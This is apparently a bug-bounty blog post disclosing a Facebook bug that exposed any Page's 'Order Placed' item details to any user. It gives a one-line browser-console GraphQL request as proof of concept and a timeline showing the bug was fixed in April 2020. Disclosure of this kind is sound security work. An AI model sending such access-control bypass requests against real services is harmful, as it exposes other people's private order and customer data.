---
layout: post
title:  "See recent order items of any Facebook page"
date:   2020-08-05 21:44:46 -0800
categories: blog
---
When Page admin adds the "Order Placed" label to the user message, Page admin can also include the details of the order such as item name, notes, image, etc. This bug allow any user to view details of these order items of any Facebook page. 
<br />

![](/images/fb_order.png)

**Proof of concept**

Send the following request in the browser console by replacing {Page_ID} with the ID of the target page.
```
new AsyncRequest('/api/graphql/').setData({variables:'{"pageID":"{Page_ID}"}',doc_id:2571623202931955}).send()
```

The response would contain the recent order items of the targeted page.

**Timeline**	
<br />

30 March 2020 - Report Sent\
1 April 2020 - Acknowledged by Facebook\
2 April 2020 - Fixed by Facebook\
3 April 2020 - Confirmation of patch by me\
9 April 2020 - Bounty Awarded by Facebook
